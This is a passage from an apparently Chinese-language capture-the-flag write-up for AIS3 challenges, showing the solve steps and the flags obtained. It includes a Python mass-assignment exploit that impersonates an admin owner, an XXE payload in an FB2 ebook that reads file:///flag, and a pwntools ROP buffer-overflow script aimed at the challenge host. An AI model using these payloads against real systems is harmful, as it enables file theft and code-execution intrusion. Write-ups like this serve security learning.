Post&quot;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    reg := regexp.MustCompile(<span class="string">`[^a-zA-Z0-9]`</span>)</span><br><span class="line">    postdata.Template = reg.ReplaceAllString(postdata.Template, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> _, err := os.Stat(path.Clean(path.Join(<span class="string">&quot;./template&quot;</span>, postdata.Template))); </span><br><span class="line">        path.Clean(path.Join(<span class="string">&quot;./template&quot;</span>, postdata.Template)) == path.Clean(<span class="string">&quot;./template&quot;</span>) ||</span><br><span class="line">        errors.Is(err, os.ErrNotExist) &#123;</span><br><span class="line">        errutil.AbortAndError(c, &amp;errutil.Err&#123;</span><br><span class="line">            Code: <span class="number">400</span>,</span><br><span class="line">            Msg: <span class="string">&quot;Invalid Post&quot;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    postdata.Create()</span><br><span class="line"></span><br><span class="line">    c.String(<span class="number">200</span>, <span class="string">&quot;Post success&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>發現序列化綁成json的時候會把所有參數直接吃進去，而”owner”字串正好就可以由一般使用者發文後渲染成<code>4dm1n1337</code>。<br>像這樣：  </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;pwned by whale120&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;owner&quot;</span><span class="punctuation">:</span><span class="string">&quot;4dm1n1337&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span><span class="string">&quot;womp&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> info</span><br><span class="line"></span><br><span class="line">cur_id=<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_cur_id</span>():</span><br><span class="line">    <span class="keyword">global</span> cur_id</span><br><span class="line">    bad_response=req.get(url+<span class="string">&#x27;/post/read?id=-1&#x27;</span>, cookies=user_cookies).text</span><br><span class="line">    <span class="keyword">while</span> req.get(url+<span class="string">f&#x27;/post/read/?id=<span class="subst">&#123;cur_id&#125;</span>&#x27;</span>, cookies=user_cookies).text != bad_response:</span><br><span class="line">        cur_id+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_user</span>(<span class="params">username, password</span>):</span><br><span class="line">    data=&#123;<span class="string">&quot;username&quot;</span>:username, <span class="string">&quot;password&quot;</span>:password&#125;</span><br><span class="line">    cookies=&#123;&#125;</span><br><span class="line">    cookies[<span class="string">&#x27;session&#x27;</span>]=req.post(url+<span class="string">&#x27;/user/login&#x27;</span>, json=data).headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].replace(<span class="string">&#x27;session=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> cookies</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_template</span>():</span><br><span class="line">    payload=<span class="string">&#x27;&#123;&#123;slice G1V3m34Fl4gpL34s3 4&#125;&#125;&#x27;</span></span><br><span class="line">    data=&#123;<span class="string">&#x27;template&#x27;</span>:payload, <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;womp&#x27;</span>&#125;</span><br><span class="line">    req.post(url+<span class="string">&#x27;/template/upload&#x27;</span>, data=data, cookies=admin_cookies)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_flag</span>():</span><br><span class="line">    payload=&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;pwned by whale120&quot;</span>,<span class="string">&quot;owner&quot;</span>:<span class="string">&quot;4dm1n1337&quot;</span>,<span class="string">&quot;template&quot;</span>:<span class="string">&quot;womp&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;&#125;&#125;</span><br><span class="line">    web=req.post(url+<span class="string">&#x27;/post/create&#x27;</span>, json=payload, cookies=user_cookies)</span><br><span class="line">    flag=req.get(url+<span class="string">f&#x27;/post/read?id=<span class="subst">&#123;cur_id&#125;</span>&#x27;</span>, cookies=user_cookies).json()[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">    info(<span class="string">f&#x27;Flag : AIS3<span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Exploit Capooooooooost!!!&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;The target capoost base url.&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    url=args.url</span><br><span class="line">    <span class="keyword">if</span> url[-<span class="number">1</span>]==<span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">        url=url[:-<span class="number">1</span>]</span><br><span class="line">    user_cookies=login_user(<span class="string">&#x27;whale120&#x27;</span>, <span class="string">&#x27;whale120&#x27;</span>)</span><br><span class="line">    admin_cookies=login_user(<span class="string">&#x27;4dm1n1337&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    info(<span class="string">&#x27;Login Success&#x27;</span>)</span><br><span class="line">    check_cur_id()</span><br><span class="line">    info(<span class="string">f&#x27;Current post id = <span class="subst">&#123;cur_id&#125;</span>&#x27;</span>)</span><br><span class="line">    upload_template()</span><br><span class="line">    info(<span class="string">&#x27;Template Uploaded&#x27;</span>)</span><br><span class="line">    read_flag()</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/BkAvY6bNR.png" alt="image">  </p>
<blockquote>
<p>Flag:AIS3{go_4w4y_WhY_Ar3_y0U_H3R3_Capoo:(}</p>
</blockquote>
<h4 id="Ebook-Parser"><a href="#Ebook-Parser" class="headerlink" title="Ebook Parser"></a>Ebook Parser</h4><p><strong>app.py</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv, path</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ebookmeta</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> flask.helpers <span class="keyword">import</span> send_from_directory</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, static_folder=<span class="string">&#x27;static/&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/parse&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ebook&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No File!&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    file = request.files[<span class="string">&#x27;ebook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> tempfile.TemporaryDirectory() <span class="keyword">as</span> directory:</span><br><span class="line">        suffix = pathlib.Path(file.filename).suffix</span><br><span class="line">        fp = path.join(directory, <span class="string">f&quot;<span class="subst">&#123;secrets.token_hex(<span class="number">8</span>)&#125;</span><span class="subst">&#123;suffix&#125;</span>&quot;</span>)</span><br><span class="line">        file.save(fp)</span><br><span class="line">        app.logger.info(fp)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            meta = ebookmeta.get_metadata(fp)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&quot;\n&quot;</span>.join([</span><br><span class="line">                <span class="string">f&quot;Title: <span class="subst">&#123;meta.title&#125;</span>&quot;</span>,</span><br><span class="line">                <span class="string">f&quot;Author: <span class="subst">&#123;meta.author_list_to_string()&#125;</span>&quot;</span>,</span><br><span class="line">                <span class="string">f&quot;Lang: <span class="subst">&#123;meta.lang&#125;</span>&quot;</span>,</span><br><span class="line">            ])&#125;)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;e.__class__.__name__&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    port = getenv(<span class="string">&quot;PORT&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=port)</span><br></pre></td></tr></table></figure>
<p>上github挖到了這個issue：<a target="_blank" rel="noopener" href="https://github.com/dnkorpushov/ebookmeta/issues/16">https://github.com/dnkorpushov/ebookmeta/issues/16</a><br>payload改一下上傳就拿到flagㄌ<br><strong>exp.fb2</strong>  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FictionBook</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.gribuser.ru/xml/fictionbook/2.0&quot;</span> <span class="attr">xmlns:l</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title-info</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">genre</span>&gt;</span>antique<span class="tag">&lt;/<span class="name">genre</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="tag">&lt;<span class="name">first-name</span>&gt;</span><span class="tag">&lt;/<span class="name">first-name</span>&gt;</span><span class="tag">&lt;<span class="name">last-name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">last-name</span>&gt;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">book-title</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">book-title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">lang</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">lang</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">title-info</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">document-info</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="tag">&lt;<span class="name">first-name</span>&gt;</span><span class="tag">&lt;/<span class="name">first-name</span>&gt;</span><span class="tag">&lt;<span class="name">last-name</span>&gt;</span>Unknown<span class="tag">&lt;/<span class="name">last-name</span>&gt;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">program-used</span>&gt;</span>calibre 6.13.0<span class="tag">&lt;/<span class="name">program-used</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">date</span>&gt;</span>26.5.2024<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>eb5cbf82-22b5-4331-8009-551a95342ea0<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">document-info</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">publish-info</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">publish-info</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="symbol">&amp;lt;</span>root<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="symbol">&amp;lt;</span>/root<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">FictionBook</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/HJMOssbEA.png" alt="image">  </p>
<blockquote>
<p>Flag: AIS3{LP#1742885: lxml no longer expands external entities (XXE) by default}</p>
</blockquote>
<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="Mathter"><a href="#Mathter" class="headerlink" title="Mathter"></a>Mathter</h4><p>在main函數中會先進入calculator的函數：<br><img src="https://hackmd.io/_uploads/HyuWJ11EC.png" alt="image"><br>輸入q就可以略過  </p>
<p>略過後會進到 goodbye 的函數，這邊使用<code>gets</code>函數而出現了 Buffer Overflow的洞：  </p>
<p><img src="https://hackmd.io/_uploads/SJAMkJJ4C.png" alt="image"></p>
<p>大小為4<br>而這個程式結尾沒有__stack__chk__fail，所以不需要繞過保護。  </p>
<p>接著觀察程式，發現win1和win2的函數，分別把flag切成前半以及後半段：<br><strong>win1</strong><br><img src="https://hackmd.io/_uploads/BkDskJJNR.png" alt="image">  </p>
<p><strong>win2</strong><br><img src="https://hackmd.io/_uploads/rJS2k11NR.png" alt="image">  </p>
<p>可是要讓<code>a1</code>變成他們分別要求的數字，利用radare2做觀察：<br><img src="https://hackmd.io/_uploads/Bk5A1JJNC.png" alt="image">  </p>
<p>arg在rdi上面，最後只需加上pop rdi的gadget改掉rdi值就可以跳過去拿到flag。  </p>
<p><img src="https://hackmd.io/_uploads/BJn7g1kNC.png" alt="image">  </p>
<p>最後採用兩次連線的方法前後拿到flag並組合：<br><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#rop=ROP(&#x27;./mathter&#x27;)</span></span><br><span class="line"><span class="comment">#r=process(&#x27;./mathter&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># datas</span></span><br><span class="line"></span><br><span class="line">win1=<span class="number">0x004018c5</span></span><br><span class="line">win2=<span class="number">0x00401997</span></span><br><span class="line">key1=<span class="number">0xDEADBEEF</span></span><br><span class="line">key2=<span class="number">0xCAFEBABE</span></span><br><span class="line">pop_rdi=<span class="number">0x402540</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;chals1.ais3.org&#x27;</span>, <span class="number">50001</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;Y&#x27;</span>*<span class="number">12</span>+p64(pop_rdi)+p64(key1)+p64(win1))</span><br><span class="line"><span class="built_in">print</span>(r.recvall().decode())</span><br><span class="line">r.close()</span><br><span class="line">r=remote(<span class="string">&#x27;chals1.ais3.org&#x27;</span>, <span class="number">50001</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;Y&#x27;</span>*<span class="number">12</span>+p64(pop_rdi)+p64(key2)+p64(win2))</span><br><span class="line"><span class="built_in">print</span>(r.recvall().decode())</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Flag:AIS3{0mg_k4zm4_mu57_b3_k1dd1ng_m3_2e89c9}</p>
</blockquote>
<h3 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h3><h4 id="The-Long-Print"><a href="#The-Long-Print" class="headerlink" title="The Long Print"></a>The Long Print</h4><p>直接運行程式會發現跑很久，以ida打開發現有sleep，先把秒數patch成0  </p>
<p><strong>before</strong><br><img src="https://hackmd.io/_uploads/BJmXFy1VC.png" alt="image">  </p>
<p><strong>after</strong><br><img src="https://hackmd.io/_uploads/SJTXFJk4C.png" alt="image">  </p>
<p>接著會發現每次輸出都會被fflush刪除flag內容，利用strace指令去追蹤：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace ./flag-printer-dist</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/H1zvtyyNR.png" alt="image">  </p>
<p>最後再一個個撿回來拼就好：  </p>
<blockquote>
<p>Flag:AIS3{You_are_the_master_of_time_management!!!!?}</p>
</blockquote>
<h4 id="火拳のエース"><a href="#火拳のエース" class="headerlink" title="火拳のエース"></a>火拳のエース</h4><p>一個密碼檢查程式，先看ghidra結果：<br><strong>print_flag()</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_flag</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  <span class="type">__useconds_t</span> local_10;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;What I\&#x27;m about to say. Old Man... Everyone... And you, Luffy... Even though... I\&#x27;m so wor thless... Even though... I carry the blood of a demon... Thank you... For loving me\nThe fla g is &quot;</span></span><br><span class="line">        );</span><br><span class="line">  local_10 = <span class="number">2000000</span>;</span><br><span class="line">  usleep(<span class="number">2000000</span>);</span><br><span class="line">  <span class="keyword">for</span> (local_14 = <span class="number">0</span>; (&amp;DAT_0804a008)[local_14] != <span class="string">&#x27;\0&#x27;</span>; local_14 = local_14 + <span class="number">1</span>) &#123;</span><br><span class="line">    usleep(local_10);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,(<span class="type">int</span>)(<span class="type">char</span>)(&amp;DAT_0804a008)[local_14]);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    local_10 = local_10 &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  usleep(local_10);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n...uh, the rest, I\&#x27;ve forgotten it. Do you remember the rest of it?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再去翻殘留資料段可以拿到前面的flag：<code>AIS3&#123;G0D</code>(或者直接跑起來)<br><img src="https://hackmd.io/_uploads/BJlUsfJEA.png" alt="image"><br><strong>main</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">undefined4 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> cVar1;</span><br><span class="line">  uint __seed;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  </span><br><span class="line">  __seed = time((<span class="type">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">  srand(__seed);</span><br><span class="line">  buffer0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">  buffer1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">  buffer2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">  buffer3 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer0,<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer1,<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer2,<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer3,<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line">  print_flag();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s %8s %8s %8s&quot;</span>,buffer0,buffer1,buffer2,buffer3);</span><br><span class="line">  xor_strings(buffer0,&amp;DAT_0804a163,buffer0);</span><br><span class="line">  xor_strings(buffer1,&amp;DAT_0804a16c,buffer1);</span><br><span class="line">  xor_strings(buffer2,&amp;DAT_0804a175,buffer2);</span><br><span class="line">  xor_strings(buffer3,&amp;DAT_0804a17e,buffer3);</span><br><span class="line">  <span class="keyword">for</span> (local_14 = <span class="number">0</span>; local_14 &lt; <span class="number">8</span>; local_14 = local_14 + <span class="number">1</span>) &#123;</span><br><span class="line">    cVar1 = complex_function((<span class="type">int</span>)buffer0[local_14],local_14);</span><br><span class="line">    buffer0[local_14] = cVar1;</span><br><span class="line">    cVar1 = complex_function((<span class="type">int</span>)buffer1[local_14],local_14 + <span class="number">0x20</span>);</span><br><span class="line">    buffer1[local_14] = cVar1;</span><br><span class="line">    cVar1 = complex_function((<span class="type">int</span>)buffer2[local_14],local_14 + <span class="number">0x40</span>);</span><br><span class="line">    buffer2[local_14] = cVar1;</span><br><span class="line">    cVar1 = complex_function((<span class="type">int</span>)buffer3[local_14],local_14 + <span class="number">0x60</span>);</span><br><span class="line">    buffer3[local_14] = cVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar2 = <span class="built_in">strncmp</span>(buffer0,<span class="string">&quot;DHLIYJEG&quot;</span>,<span class="number">8</span>);</span><br><span class="line">  <span 